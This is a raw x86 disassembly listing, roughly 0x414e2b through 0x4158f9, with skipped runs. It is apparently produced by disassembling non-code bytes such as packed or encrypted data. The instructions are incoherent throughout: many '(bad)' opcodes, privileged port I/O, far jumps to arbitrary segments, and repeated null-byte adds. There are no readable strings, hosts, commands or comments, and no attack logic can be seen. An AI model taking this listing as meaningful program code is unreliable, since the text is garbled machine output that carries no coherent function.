  414e2b:	pop    eax
  414e2c:	ja     0x414e7b
  414e2e:	je     0x414ea6
  414e30:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  414e34:	in     al,0xf5
  414e36:	jnp    0x414e86
  414e38:	jnp    0x414e08
  414e3a:	cmc    
  414e3b:	push   DWORD PTR [ebx]
  414e3d:	sar    ebx,cl
  414e3f:	fnstcw WORD PTR [ebx]
  414e41:	call   0x0:0xe58c3bc7
  414e48:	cmc    
  414e49:	add    BYTE PTR [eax],al
  414e4b:	add    dl,dh
  414e4d:	stos   BYTE PTR es:[edi],al
  414e4e:	jg     0x414e14
  414e50:	les    ebx,FWORD PTR [edi+0x39f46572]
  414e56:	(bad)  
  414e57:	lock enter 0xfa0c,0x2f
  414e5c:	test   al,0xb
  414e5e:	inc    edi
  414e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e60:	mov    al,0x8
  414e62:	mov    ds:0x73455d08,eax
  414e67:	mov    cl,BYTE PTR ds:0xbbede711
  414e6d:	sbb    BYTE PTR [edx],cl
  414e6f:	out    dx,eax
  414e70:	or     esp,DWORD PTR [esp+edi*8]
  414e73:	fwait
  414e74:	retf   
  414e75:	fisub  DWORD PTR [esi]
  414e77:	daa    
  414e78:	cdq    
  414e79:	pop    es
  414e7a:	push   ebp
  414e7b:	ret    
  414e7c:	lds    esp,FWORD PTR [ebx+0x9160257]
  414e82:	add    BYTE PTR [edx+0xe],ah
  414e85:	add    ebp,ecx
  414e87:	test   al,0x9
  414e89:	cmc    
  414e8a:	inc    edi
  414e8b:	adc    eax,0x2ada0ae3
  414e90:	fst    QWORD PTR [eax]
  414e92:	fldcw  WORD PTR [esp+eiz*2-0x6e]
  414e97:	or     BYTE PTR [ecx-0x21748979],0xb2
  414e9e:	sub    ah,BYTE PTR [edx]
  414ea0:	add    DWORD PTR [edi+edx*1+0x79],eax
  414ea4:	add    edi,DWORD PTR [edx+0x41]
  414ea7:	nop
  414ea8:	fistp  DWORD PTR [edx-0x232bb692]
  414eae:	cmp    bl,BYTE PTR [esi-0x46]
  414eb1:	xor    BYTE PTR [ecx+0x550328a0],ah
  414eb7:	jl     0x414f0d
  414eb9:	lods   al,BYTE PTR ds:[esi]
  414eba:	frstor [eax-0x42]
  414ebd:	inc    esp
  414ebe:	pop    esp
  414ebf:	xor    al,0x7d
  414ec1:	adc    al,0x97
  414ec3:	mov    al,0x4d
  414ec5:	retf   
  414ec6:	jge    0x414f36
  414ec8:	cmp    edi,ebp
  414eca:	dec    esp
  414ecb:	fdivr  QWORD PTR [edx-0x5224ea68]
  414ed1:	imul   DWORD PTR [ecx]
  414ed3:	adc    DWORD PTR ds:0xf9f46121,esi
  414ed9:	xor    eax,0x3cd85733
  414ede:	fwait
  414edf:	ss jmp 0xe3bc:0x3c652524
  414ee7:	cmp    al,0xe6
  414ee9:	clc    
  414eea:	jnp    0x414f01
  414eec:	mov    ecx,0x34bc7e65
  414ef1:	adc    DWORD PTR [edi+0x4b45c182],esp
  414ef7:	(bad)  
  414ef8:	(bad)  
  414ef9:	pop    esi
  414efa:	out    dx,al
  414efb:	hlt    
  414efc:	fs push edx
  414efe:	cld    
  414eff:	in     al,0x2f
  414f01:	inc    BYTE PTR [eax]
  414f03:	add    bh,BYTE PTR [ebx-0x460a1211]
  414f09:	jns    0x414e9f
  414f0b:	cmp    DWORD PTR [edx+0x22aa9f47],edi
  414f11:	sub    bl,bl
  414f13:	dec    edi
  414f14:	jg     0x414f1f
  414f16:	inc    edx
  414f17:	dec    ebp
  414f18:	inc    edi
  414f19:	cmp    cl,BYTE PTR [edi]
  414f1b:	pop    edi
  414f1c:	ror    eax,cl
  414f1e:	dec    edx
  414f1f:	sub    bl,BYTE PTR [eax]
  414f21:	jg     0x414fa2
  414f23:	pusha  
  414f24:	(bad)  
  414f26:	(bad)  
  414f27:	sub    esp,edx
  414f29:	icebp  
  414f2a:	stc    
  414f2b:	jne    0x414f09
  414f2d:	dec    edx
  414f2e:	fdivr  DWORD PTR [eax-0xcc4c52c]
  414f34:	or     DWORD PTR [eax-0x67c546ef],ebx
  414f3a:	int3   
  414f3b:	add    edi,esi
  414f3d:	div    DWORD PTR [esi]
  414f3f:	cmp    eax,0x93
	...
  414fb4:	pop    edx
  414fb5:	ficom  DWORD PTR [esi+0x60]
  414fb8:	(bad)  
  414fb9:	in     al,dx
  414fba:	jle    0x414fb6
  414fbc:	cs pop ebx
  414fbe:	pop    ss
  414fbf:	ret    0x1ccf
  414fc2:	inc    edi
  414fc3:	adc    eax,DWORD PTR [ecx-0xaffff1a]
  414fc9:	add    BYTE PTR [eax],al
  414fcb:	add    BYTE PTR [eax-0x3d6b609f],ch
  414fd1:	(bad)  
  414fd2:	ficom  WORD PTR [edx]
  414fd4:	sar    esi,cl
  414fd6:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  414fd8:	retf   
  414fd9:	mov    BYTE PTR [ebx+esi*8],dl
  414fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fdd:	mov    cl,0xd2
  414fdf:	jb     0x414f66
  414fe1:	add    BYTE PTR [ebx+0x14],cl
  414fe4:	pop    edx
  414fe5:	cmp    al,0xa9
  414fe7:	sbb    DWORD PTR [eax],ebp
  414fe9:	aas    
  414fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414feb:	out    0x31,eax
  414fed:	jl     0x414fc7
  414fef:	mov    dl,0x3e
  414ff1:	(bad)  
  414ff2:	loop   0x414fa3
  414ff4:	(bad)  
  414ff5:	cmc    
  414ff6:	retf   0x6aba
  414ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ffa:	xor    BYTE PTR [ebx+edx*8],bl
  414ffd:	fsub   QWORD PTR [edi+0x2c]
  415000:	aas    
  415001:	lahf   
  415002:	scas   eax,DWORD PTR es:[edi]
  415003:	inc    edi
  415004:	arpl   cx,sp
  415006:	sbb    al,0x29
  415008:	pop    ecx
  415009:	xchg   ebp,eax
  41500a:	xchg   DWORD PTR [edx-0x1569f476],esp
  415010:	mov    dl,0xe5
  415012:	or     esi,0x30
  415015:	shr    DWORD PTR [edi+0x58],0xc9
  415019:	dec    ecx
  41501a:	int3   
  41501b:	sub    dh,bl
  41501d:	aas    
  41501e:	mov    cl,ch
  415020:	jge    0x41503d
  415022:	pop    es
  415023:	arpl   WORD PTR [edi-0x3f],cx
  415026:	out    0x2c,al
  415028:	inc    ebp
  415029:	fwait
  41502a:	mov    ch,BYTE PTR [esi-0x7cfe0bf2]
  415030:	clc    
  415031:	push   ss
  415032:	ins    BYTE PTR es:[edi],dx
  415033:	lods   al,BYTE PTR ds:[esi]
  415034:	je     0x4150a4
  415036:	mov    esi,0x39ec85c7
  41503b:	add    al,ch
  41503d:	push   esp
  41503e:	mov    BYTE PTR [edi-0x447d1eb9],bl
  415044:	mov    eax,0xf9a8c50c
  415049:	(bad)  
  41504a:	test   eax,0xf611823e
  41504f:	mov    dh,0x55
  415051:	push   ds
  415052:	loop   0x41505e
  415054:	outs   dx,DWORD PTR ds:[esi]
  415055:	(bad)  
  415056:	out    dx,eax
  415057:	inc    ebx
  415058:	scas   eax,DWORD PTR es:[di]
  41505a:	xchg   ecx,eax
  41505b:	loop   0x414ff2
  41505d:	hlt    
  41505e:	fwait
  41505f:	stc    
  415060:	ret    0x537b
  415063:	call   0xcbd1:0xc05cce27
  41506a:	push   ebp
  41506b:	imul   ecx,DWORD PTR [edi+0x3550d0df],0xffffffab
  415072:	inc    esp
  415073:	clc    
  415074:	pop    es
  415075:	or     eax,0xf7184cc3
  41507a:	lahf   
  41507b:	and    esi,eax
  41507d:	pop    ecx
  41507e:	inc    esi
  41507f:	mov    dl,0x3c
  415081:	outs   dx,DWORD PTR ds:[esi]
  415082:	xchg   ebx,eax
  415083:	inc    esi
  415084:	dec    edx
  415085:	ja     0x41502a
  415087:	jo     0x4150ea
  415089:	fisub  DWORD PTR [eax]
  41508b:	and    BYTE PTR [eax+0x2e],bh
  41508e:	xor    eax,0x2b8bbab5
  415093:	clc    
  415094:	xchg   DWORD PTR [eax+0x9eb7e6e],esi
  41509a:	fs inc ebx
  41509c:	mov    ds,WORD PTR ds:0x22b53580
  4150a2:	aaa    
  4150a3:	fyl2x  
  4150a5:	mov    al,ds:0x415d7204
  4150aa:	sahf   
  4150ab:	cmp    al,0x57
  4150ad:	mov    edi,0x82cf4159
  4150b2:	sbb    DWORD PTR [edx],esp
  4150b4:	jno    0x41508f
  4150b6:	add    ch,BYTE PTR [ecx+esi*2-0x11]
  4150ba:	pop    DWORD PTR [ecx+0x1c13171f]
  4150c0:	inc    edi
	...
  415131:	add    BYTE PTR [eax],al
  415133:	add    BYTE PTR [edx],al
  415135:	adc    al,BYTE PTR [ecx]
  415137:	mov    ds:0xb3a2b311,eax
  41513c:	adc    ah,BYTE PTR [esi-0xc133b27]
  415142:	push   es
  415143:	fnstenv [esi-0x19]
  415146:	add    BYTE PTR [eax],al
  415148:	cmc    
  415149:	add    BYTE PTR [eax],al
  41514b:	add    ah,al
  41514d:	cmp    eax,0x68f63a8d
  415152:	call   DWORD PTR fs:[ebp+0x318bd173]
  415159:	mov    bl,0x72
  41515b:	mov    bh,0x95
  41515d:	nop
  41515e:	push   ebx
  41515f:	mov    bl,0x21
  415161:	sub    ebp,DWORD PTR [ecx+0x2a]
  415164:	loopne 0x4151b3
  415166:	xor    eax,0xd25869ed
  41516b:	outs   dx,DWORD PTR ds:[esi]
  41516c:	push   esp
  41516d:	retf   
  41516e:	stos   DWORD PTR es:[edi],eax
  41516f:	pusha  
  415170:	pop    ebp
  415171:	shl    bh,1
  415173:	push   edi
  415174:	xchg   esi,eax
  415175:	mov    bl,0x75
  415177:	sbb    al,0xcb
  415179:	shl    DWORD PTR [ebx+0x6e],0xdf
  41517d:	xchg   edi,eax
  41517e:	jmp    0xca83:0x68ea64f9
  415185:	ret    
  415186:	shl    DWORD PTR [ebp*1+0x393e046f],cl
  41518d:	outs   dx,DWORD PTR ds:[esi]
  41518e:	ins    DWORD PTR es:[edi],dx
  41518f:	pop    eax
  415190:	mov    edx,0x3eba75e9
  415195:	imul   ebp,ebp,0xffffffa4
  415198:	mov    DWORD PTR [edi+0x51],edi
  41519b:	mov    cl,0xc
  41519d:	out    dx,eax
  41519e:	jmp    0x415121
  4151a0:	dec    ecx
  4151a1:	dec    edx
  4151a2:	dec    edi
  4151a3:	daa    
  4151a4:	inc    edx
  4151a5:	mov    dl,0xc3
  4151a7:	scas   eax,DWORD PTR es:[edi]
  4151a8:	and    eax,esi
  4151aa:	inc    esp
  4151ab:	mov    dh,0x2d
  4151ad:	imul   ebx,DWORD PTR [ecx],0x89ee530
  4151b3:	mov    BYTE PTR [eax-0x42],dh
  4151b6:	sub    bh,BYTE PTR [esi-0x6dfda9de]
  4151bc:	cli    
  4151bd:	mov    ebp,0xf7262f41
  4151c2:	push   esi
  4151c3:	mov    bl,0x70
  4151c5:	popa   
  4151c6:	jmp    0x6ebb:0x7af04635
  4151cd:	mov    dh,0x28
  4151cf:	pop    eax
  4151d0:	stos   DWORD PTR es:[edi],eax
  4151d1:	cmp    ecx,DWORD PTR [ebx]
  4151d3:	mov    cl,0xf1
  4151d5:	fisttp DWORD PTR [ebx]
  4151d7:	xchg   esi,esp
  4151d9:	add    al,0xbb
  4151db:	add    esp,DWORD PTR gs:[edi+0x2d49ae22]
  4151e2:	repnz (bad) 
  4151e4:	out    0x6f,al
  4151e6:	(bad)  
  4151e7:	push   ecx
  4151e9:	cmp    al,0x4a
  4151eb:	icebp  
  4151ec:	mov    ah,0x97
  4151ee:	dec    esp
  4151ef:	sbb    ah,BYTE PTR [ebx]
  4151f1:	fidiv  DWORD PTR [ecx]
  4151f3:	xor    BYTE PTR [esi],0x59
  4151f6:	push   ebx
  4151f7:	pop    edi
  4151f8:	pop    ss
  4151f9:	hlt    
  4151fa:	jno    0x415248
  4151fc:	xchg   edi,eax
  4151fd:	cdq    
  4151fe:	adc    eax,0x316dc07d
  415203:	push   ebp
  415204:	in     al,dx
  415205:	xchg   esp,eax
  415206:	mov    cl,0x73
  415208:	ins    DWORD PTR es:[edi],dx
  415209:	int    0xfc
  41520b:	int3   
  41520c:	pop    ebp
  41520d:	lahf   
  41520e:	or     al,0x1b
  415210:	sub    DWORD PTR [ecx-0x62],esp
  415213:	xchg   BYTE PTR [ebx+0x5e],bl
  415216:	aam    0x6e
  415218:	(bad)  
  415219:	dec    al
  41521b:	mov    edx,0xf86f1426
  415220:	out    0x3a,eax
  415222:	mov    dl,0xcf
  415224:	popf   
  415225:	jno    0x4151d6
  415227:	setp   BYTE PTR [ecx]
  41522a:	ror    ecx,1
  41522c:	or     al,0xff
  41522e:	xchg   edi,eax
  41522f:	mov    bh,0x85
  415231:	cs cmp al,0xcc
  415234:	retf   0xde52
  415237:	push   ebp
  415238:	clc    
  415239:	es pop ebx
  41523b:	test   eax,0x30cab6a8
  415240:	and    al,0x0
	...
  4152b2:	add    BYTE PTR [eax],al
  4152b4:	add    DWORD PTR [ecx-0x2122293],eax
  4152ba:	mov    cl,0xdd
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	pop    es
  4152c1:	neg    BYTE PTR [ecx]
  4152c3:	enter  0xe86b,0x0
  4152c7:	add    ch,dh
  4152c9:	add    BYTE PTR [eax],al
  4152cb:	add    BYTE PTR [esi-0x44dde861],dh
  4152d1:	mov    ebp,0x82332008
  4152d6:	inc    esi
  4152d7:	inc    ebp
  4152d8:	lea    eax,[ebx*1-0x3ecc5816]
  4152df:	mov    ch,BYTE PTR [ebp+0x7f]
  4152e2:	adc    DWORD PTR ds:0x8cc8315f,esp
  4152e8:	sub    BYTE PTR [bx+di],al
  4152eb:	jae    0x4152ac
  4152ed:	adc    BYTE PTR [edi+0x4a],ah
  4152f0:	and    bl,BYTE PTR [ebx+0x3ebee3ff]
  4152f6:	or     DWORD PTR [esi+0x6f],eax
  4152f9:	enter  0x9483,0x18
  4152fd:	imul   eax,DWORD PTR [ecx-0x566e3977],0xa45fab4
  415307:	jecxz  0x415330
  415309:	jbe    0x4152e3
  41530b:	ja     0x415357
  41530d:	(bad)  
  41530e:	lods   eax,DWORD PTR ds:[esi]
  41530f:	ja     0x4152ea
  415311:	sbb    BYTE PTR [edi],ch
  415313:	cwde   
  415314:	pop    ecx
  415315:	sahf   
  415316:	push   ebp
  415317:	add    cl,BYTE PTR [esi+0x33b0a0b0]
  41531d:	test   eax,0x716f89a5
  415322:	jne    0x41533c
  415324:	xlat   BYTE PTR ds:[ebx]
  415325:	sbb    al,0x2b
  415327:	inc    edi
  415328:	dec    ebp
  415329:	mov    al,0x4b
  41532b:	mov    ebp,0xe0a4d17a
  415330:	and    BYTE PTR [eax-0x6f91171f],0xbb
  415337:	or     BYTE PTR [edi+0x63],bh
  41533a:	jae    0x4152dd
  41533c:	jmp    0x323bd798
  415341:	scas   al,BYTE PTR es:[edi]
  415342:	sub    BYTE PTR [edi+0x74],bl
  415345:	mov    ecx,0xc2f06eae
  41534a:	sub    dh,BYTE PTR [esi]
  41534c:	pop    ebp
  41534d:	leave  
  41534e:	dec    esp
  41534f:	cmp    eax,0x24ff96e8
  415354:	clc    
  415355:	xchg   edi,eax
  415356:	jo     0x415357
  415358:	mov    ds:0xd795109e,al
  41535d:	xlat   BYTE PTR ds:[ebx]
  41535e:	pop    ebp
  41535f:	jp     0x4152fd
  415361:	mov    dh,0x69
  415363:	leave  
  415364:	xor    eax,0x47b2d652
  415369:	in     al,0x63
  41536b:	inc    edi
  41536c:	loop   0x415365
  41536e:	cmp    cl,BYTE PTR [edi-0x80]
  415371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415372:	call   0xb268961
  415377:	cmp    DWORD PTR [edx-0x11],esp
  41537a:	dec    ebx
  41537b:	lods   eax,DWORD PTR ds:[esi]
  41537c:	(bad)
  41537f:	cmp    esi,ebx
  415381:	out    dx,al
  415382:	loopne 0x415365
  415384:	push   ebp
  415385:	cmp    bh,BYTE PTR [ecx+0x6c]
  415388:	push   ds
  415389:	sbb    BYTE PTR [ebx-0x3b6ceb78],bh
  41538f:	jb     0x4153a8
  415391:	data16 das 
  415393:	out    dx,eax
  415394:	stc    
  415395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415396:	clc    
  415397:	xor    eax,0x56c4a86f
  41539c:	aaa    
  41539d:	out    0x89,al
  41539f:	les    esp,FWORD PTR [ebx+0x63e050d9]
  4153a5:	push   esi
  4153a6:	mov    esp,0xb12c7aa
  4153ab:	or     DWORD PTR [eax+ebp*4],ecx
  4153ae:	enter  0x20b8,0x18
  4153b2:	test   DWORD PTR [edi+0x71],0x4be0dbe1
  4153b9:	xor    eax,0xf3ee557e
  4153be:	or     eax,0xbe8d
	...
  415433:	add    BYTE PTR [ebx+0x73],bl
  415436:	inc    edx
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	push   esi
  415441:	jg     0x4153d3
  415443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415444:	pusha  
  415445:	jmp    0x136544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	sub    eax,DWORD PTR [eax]
  41544e:	mov    ss,WORD PTR [eax-0x55]
  415451:	cdq    
  415452:	js     0x4154bf
  415454:	pop    es
  415455:	or     BYTE PTR ds:0xf92aaec6,dl
  41545b:	in     al,0xfd
  41545d:	in     eax,0xf6
  41545f:	enter  0xf935,0x3f
  415463:	sub    eax,0x8af32f35
  415468:	and    cl,dl
  41546a:	jg     0x415435
  41546c:	hlt    
  41546d:	mov    ds,WORD PTR [edx-0x6f10e5b3]
  415473:	cmp    dh,al
  415475:	retf   
  415476:	fwait
  415477:	jle    0x41542c
  415479:	inc    edx
  41547a:	mov    bl,0x14
  41547c:	rol    BYTE PTR [esi],0x28
  41547f:	mov    esi,ebx
  415481:	mov    al,0xfa
  415483:	and    BYTE PTR [eax+eiz*4-0x74725c86],al
  41548a:	add    edx,esp
  41548c:	push   ecx
  41548d:	sbb    al,BYTE PTR [edi]
  41548f:	dec    ebp
  415490:	loope  0x41550e
  415492:	sub    ah,ah
  415494:	rcl    dh,1
  415496:	mov    BYTE PTR ds:0x31346a1c,ah
  41549c:	imul   DWORD PTR [ecx*4+0x441cb68]
  4154a3:	xlat   BYTE PTR ds:[ebx]
  4154a4:	imul   esp,DWORD PTR [eax-0x7bf6a1a2],0x4f
  4154ab:	mov    al,0xd0
  4154ad:	adc    al,0xdb
  4154af:	jmp    0x5c87:0xb70c73ec
  4154b6:	aaa    
  4154b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154b8:	sti    
  4154b9:	popa   
  4154ba:	sub    ch,BYTE PTR [ecx-0xe]
  4154bd:	jae    0x4154be
  4154bf:	jl     0x415502
  4154c1:	or     al,dh
  4154c3:	ss nop
  4154c5:	sub    eax,0x7ca30627
  4154ca:	add    DWORD PTR [ecx-0x1692e038],ecx
  4154d0:	ret    0x58ff
  4154d3:	cld    
  4154d4:	(bad)  
  4154d5:	pop    eax
  4154d6:	loope  0x415554
  4154d8:	stc    
  4154d9:	enter  0x9120,0x5d
  4154dd:	push   es
  4154de:	dec    eax
  4154df:	mov    ch,0x77
  4154e1:	add    cl,bl
  4154e3:	inc    esi
  4154e4:	in     eax,0x31
  4154e6:	mov    gs,WORD PTR [eax+0x46bc27fe]
  4154ec:	dec    edi
  4154ed:	xchg   ebx,eax
  4154ee:	popf   
  4154ef:	mov    eax,0xf8ae7183
  4154f4:	jge    0x4154f1
  4154f6:	jl     0x415557
  4154f8:	mov    bh,0xa8
  4154fa:	pop    ds
  4154fb:	push   0xc86cd5ef
  415500:	fbstp  TBYTE PTR [ecx-0x77]
  415503:	mov    al,ds:0x2e9ce37c
  415508:	xchg   ecx,eax
  415509:	xor    al,0xd6
  41550b:	popa   
  41550c:	inc    edx
  41550d:	jecxz  0x41550f
  41550f:	inc    esp
  415510:	popa   
  415511:	(bad)  
  415513:	fwait
  415514:	add    BYTE PTR cs:[ecx+0x50835748],0xe2
  41551c:	pop    edi
  41551d:	adc    BYTE PTR [ebx+0x6b574b79],dl
  415523:	dec    esi
  415524:	mov    ebx,0x77100e4f
  415529:	shl    BYTE PTR [ebx],1
  41552b:	pop    eax
  41552c:	test   eax,0xb41f7f68
  415531:	std    
  415532:	inc    esi
  415533:	jmp    0x9534:0x59dadd61
  41553a:	idiv   DWORD PTR [esi-0x7501bb01]
  415540:	push   es
	...
  4155b1:	add    BYTE PTR [eax],al
  4155b3:	add    BYTE PTR [edi+0x5e],bh
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	xor    eax,0x55018c7f
  4155c5:	jmp    0x0:0xf50000
  4155cc:	xor    DWORD PTR [edx],edi
  4155ce:	in     eax,dx
  4155cf:	in     al,0x91
  4155d1:	int    0xa7
  4155d3:	push   esi
  4155d4:	rcr    BYTE PTR [ebx],1
  4155d6:	jmp    0xb0b9a04e
  4155db:	mov    eax,ds:0x8af36c9e
  4155e0:	dec    edi
  4155e1:	daa    
  4155e2:	mov    ah,0xc4
  4155e4:	mov    esi,edx
  4155e6:	mov    WORD PTR [ebp-0x3b888def],ds
  4155ec:	lods   al,BYTE PTR ds:[esi]
  4155ed:	and    al,0x43
  4155ef:	(bad)  
  4155f1:	or     al,BYTE PTR [eax-0x71]
  4155f4:	shrd   edi,esi,cl
  4155f7:	pop    esp
  4155f8:	xor    DWORD PTR [esp+eiz*8+0x7007cfd3],ecx
  4155ff:	add    DWORD PTR [ebx+0x10],0x59
  415603:	(bad)  [edx+0x29]
  415606:	jb     0x415643
  415608:	pop    edi
  415609:	mov    DWORD PTR [esi+0x75530fcd],eax
  41560f:	jl     0x415651
  415611:	add    ecx,0xa4225331
  415617:	push   eax
  415618:	mov    ch,0x9a
  41561a:	fild   WORD PTR [ebx+0x4f]
  41561d:	add    eax,DWORD PTR [esi+0x62]
  415620:	stos   BYTE PTR es:[edi],al
  415621:	sbb    DWORD PTR [edi-0x3f7deaf],edx
  415627:	not    DWORD PTR [edi]
  415629:	test   al,0x33
  41562b:	jne    0x415624
  41562d:	xor    BYTE PTR [edi+0x7a8ba715],al
  415633:	jbe    0x41560b
  415635:	stc    
  415636:	sbb    BYTE PTR [edi],0xa3
  415639:	and    cl,BYTE PTR [ebx+0x367080d]
  41563f:	dec    eax
  415640:	pop    esp
  415641:	aaa    
  415642:	xor    dh,BYTE PTR [eax+0x2a5bfe92]
  415648:	test   DWORD PTR [esp+ecx*2-0x3c],ecx
  41564c:	add    ch,BYTE PTR [ebp+0x4e]
  41564f:	in     eax,0x20
  415651:	inc    ecx
  415652:	inc    esp
  415653:	retf   
  415654:	xchg   edx,eax
  415655:	in     eax,dx
  415656:	lahf   
  415657:	inc    ebp
  415658:	cmp    al,0xb1
  41565a:	das    
  41565b:	das    
  41565c:	std    
  41565d:	dec    eax
  41565e:	jg     0x4156c5
  415660:	pusha  
  415661:	jp     0x41567c
  415663:	faddp  st(2),st
  415665:	jle    0x415691
  415667:	int3   
  415668:	lods   eax,DWORD PTR ds:[esi]
  415669:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41566a:	dec    ecx
  41566b:	or     dl,BYTE PTR [edx+eiz*1-0xdf58a39]
  415672:	call   0x5852:0xc50200d
  415679:	pop    esp
  41567a:	test   BYTE PTR [eax+eiz*2],cl
  41567d:	push   eax
  41567e:	aaa    
  41567f:	mov    al,ds:0x7cc604cc
  415684:	mov    ch,BYTE PTR [ebx-0x2fb84fc3]
  41568a:	idiv   BYTE PTR [ebx+0x2f]
  41568d:	jo     0x4156fb
  41568f:	mov    edi,0xdfa146d
  415694:	sbb    DWORD PTR [edx+0x9e44b6f],esp
  41569a:	fisub  WORD PTR [ebp-0x3c815ca]
  4156a0:	(bad)  
  4156a1:	out    0xae,al
  4156a3:	fcomi  st,st(3)
  4156a5:	mov    bh,0x58
  4156a7:	jp     0x4156fa
  4156a9:	xchg   DWORD PTR [edi+0x3d],esp
  4156ac:	pop    ebx
  4156ad:	add    eax,0x40b42b55
  4156b2:	and    DWORD PTR [ebp+eiz*4+0x50e96357],esi
  4156b9:	jns    0x4156e1
  4156bb:	cdq    
  4156bc:	xor    eax,0x1d2b55d2
	...
  415731:	add    BYTE PTR [eax],al
  415733:	add    BYTE PTR [esi+0x2f],bh
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0xac5f3dd3
  415743:	test   BYTE PTR [edx-0x15],0x0
  415747:	add    ch,dh
  415749:	add    BYTE PTR [eax],al
  41574b:	add    BYTE PTR [esi],bl
  41574d:	arpl   bx,bx
  41574f:	sub    al,0x90
  415751:	icebp  
  415752:	(bad)  
  415753:	aam    0x72
  415755:	and    ch,ch
  415757:	imul   ebp,DWORD PTR [ebp+0x46],0xf3fb6b77
  41575e:	mov    bh,dl
  415760:	shr    esi,1
  415762:	(bad)  
  415763:	clc    
  415764:	mov    eax,ds:0xd856588
  415769:	push   eax
  41576a:	adc    DWORD PTR [edx+ecx*2+0x315a0c9],ecx
  415771:	mov    edx,0x10776d73
  415776:	dec    esi
  415777:	mov    edi,0x91ae91ab
  41577c:	(bad)  
  41577d:	adc    ebp,DWORD PTR [edx-0x5f096b90]
  415783:	out    dx,al
  415784:	inc    esp
  415785:	das    
  415786:	push   0x95397347
  41578b:	test   eax,0xf7d61718
  415790:	sbb    al,dl
  415792:	imul   ecx,DWORD PTR [esi-0xa],0xfc1ae444
  415799:	cld    
  41579a:	and    al,0x7b
  41579c:	push   0x1ad1e741
  4157a1:	imul   ebx,DWORD PTR [ecx],0x36
  4157a4:	dec    esp
  4157a5:	adc    al,dh
  4157a7:	jbe    0x4157bc
  4157a9:	and    DWORD PTR [edi],esi
  4157ab:	(bad)
  4157ae:	out    dx,eax
  4157af:	div    BYTE PTR [esi+edi*4+0xf]
  4157b3:	adc    eax,0x194daa24
  4157b8:	aas    
  4157b9:	nop
  4157ba:	pop    es
  4157bb:	fisttp DWORD PTR [edi+edi*1+0x2de3711f]
  4157c2:	adc    ebp,DWORD PTR [edi+ecx*2+0x14]
  4157c6:	outs   dx,DWORD PTR ds:[esi]
  4157c7:	or     al,0x8
  4157c9:	adc    ah,bh
  4157cb:	mov    ds:0xb7ed8529,eax
  4157d0:	mov    al,0x62
  4157d2:	sar    BYTE PTR [edi+edi*2-0x73],1
  4157d6:	xchg   edi,eax
  4157d7:	ret    
  4157d8:	pop    edx
  4157d9:	jno    0x4157d2
  4157db:	jae    0x415810
  4157dd:	xchg   ebx,eax
  4157de:	push   es
  4157df:	pop    ebx
  4157e0:	in     eax,dx
  4157e1:	sub    eax,0x47213715
  4157e6:	jb     0x4157ad
  4157e8:	pop    esi
  4157e9:	rcl    BYTE PTR [edi-0x30414490],cl
  4157ef:	in     al,dx
  4157f0:	xbegin 0xde6e2946
  4157f6:	icebp  
  4157f7:	sub    BYTE PTR [ebx-0x18],ch
  4157fa:	dec    ecx
  4157fb:	cmc    
  4157fc:	test   BYTE PTR [ebx],cl
  4157fe:	das    
  4157ff:	sti    
  415800:	in     al,0x58
  415802:	(bad)  
  415803:	mov    cl,0xd0
  415805:	or     eax,0xf7017736
  41580a:	lock and esi,DWORD PTR [edx-0x6235a66d]
  415811:	add    al,0xd9
  415813:	test   eax,0xe52e2b78
  415818:	adc    BYTE PTR [edi-0x125b5e8b],bl
  41581e:	dec    esi
  41581f:	test   DWORD PTR [eax],edi
  415821:	mov    ecx,0x5faaedbb
  415826:	aas    
  415827:	faddp  st(6),st
  415829:	lods   al,BYTE PTR ds:[esi]
  41582a:	mov    ah,0xab
  41582c:	pop    ebp
  41582d:	jne    0x41589a
  41582f:	sub    DWORD PTR [edx],ecx
  415831:	ins    BYTE PTR es:[edi],dx
  415832:	mov    edi,0xfb1192b2
  415837:	out    dx,al
  415838:	addr16 sbb dh,al
  41583b:	pop    es
  41583c:	pop    edi
  41583d:	loope  0x415846
  41583f:	gs jmp 0x415845
	...
  4158b1:	add    BYTE PTR [eax],al
  4158b3:	add    BYTE PTR [ebx],cl
  4158b5:	jle    0x415889
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0x4d3fcffe
  4158c3:	fnstcw WORD PTR [edi]
  4158c5:	in     al,dx
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	cmc    
  4158c9:	add    BYTE PTR [eax],al
  4158cb:	add    BYTE PTR [ebp-0x53],al
  4158ce:	or     cl,BYTE PTR [edi+0x39]
  4158d1:	dec    esi
  4158d2:	(bad)  
  4158d3:	cli    
  4158d4:	mov    WORD PTR [eax+0x68],ds
  4158d7:	or     ecx,edi
  4158d9:	jge    0x4158cb
  4158db:	ins    DWORD PTR es:[edi],dx
  4158dc:	add    bl,BYTE PTR [eax-0x29]
  4158df:	push   ds
  4158e0:	out    dx,al
  4158e1:	shr    DWORD PTR [ebp+0x1d5460d1],0xc3
  4158e8:	test   eax,0x66d2cc42
  4158ed:	(bad)  
  4158ee:	test   BYTE PTR [ebx+edi*2+0x4f4cf02a],ah
  4158f5:	inc    esi
  4158f6:	push   esp
  4158f7:	sbb    bh,cl
  4158f9:	(bad)  
